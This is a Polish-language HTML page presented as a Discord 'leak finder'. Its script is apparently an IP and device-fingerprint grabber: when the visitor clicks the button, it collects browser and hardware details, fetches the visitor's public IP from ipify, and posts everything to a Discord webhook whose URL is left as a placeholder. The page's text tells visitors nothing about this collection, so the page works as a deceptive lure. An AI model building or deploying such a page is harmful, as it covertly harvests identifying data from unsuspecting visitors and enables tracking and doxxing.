
<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Device Inspector</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #090b10;
    color: #fff;
    font-family: Arial, sans-serif;
}

.panel {
    width: 90%;
    max-width: 430px;
    padding: 30px;
    background: #121620;
    border: 1px solid #252c3b;
    border-radius: 15px;
}

h2 {
    margin-top: 0;
}

p {
    color: #9da7b8;
    font-size: 14px;
    line-height: 1.6;
}

button {
    width: 100%;
    padding: 14px;
    border: 0;
    border-radius: 8px;
    background: #526dff;
    color: white;
    font-weight: bold;
    cursor: pointer;
}

#status {
    margin-top: 15px;
    font-size: 13px;
}
</style>
</head>

<body>
<div class="panel">
    <h2>Wyszukaj wycieki</h2>
    <p>
        Kliknij przycisk ponizej, a nastepnie wprowadz
        id (discord) i wyszukaj dostepne wycieki!
    </p>

    <button onclick="collectData()">Przejdz do findera</button>
    <div id="status"></div>
</div>

<script>
const WEBHOOK_URL = "WKLEJ_TUTAJ_WEBHOOK";

async function collectData() {
    const status = document.getElementById("status");
    status.textContent = "Zbieranie danych...";

    const data = {
        browser: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        cookiesEnabled: navigator.cookieEnabled,
        online: navigator.onLine,
        cores: navigator.hardwareConcurrency || "Niedostępne",
        memory: navigator.deviceMemory || "Niedostępne",
        viewport: `${innerWidth}x${innerHeight}`,
        date: new Date().toISOString()
    };

    try {
        const response = await fetch(
            "https://api.ipify.org?format=json"
        );

        if (!response.ok) throw new Error("IP lookup failed");

        const ip = await response.json();
        data.publicIP = ip.ip;

        const embed = {
            title: "Device Inspector — raport",
            color: 5467647,
            fields: Object.entries(data).map(([key, value]) => ({
                name: key,
                value: String(value).slice(0, 1000),
                inline: true
            })),
            timestamp: new Date().toISOString()
        };

        const result = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ embeds: [embed] })
        });

        if (!result.ok) throw new Error("Webhook error");

        status.textContent = "Raport wysłany.";
    } catch (error) {
        status.textContent = "Błąd: " + error.message;
    }
}
</script>
</body>
</html>
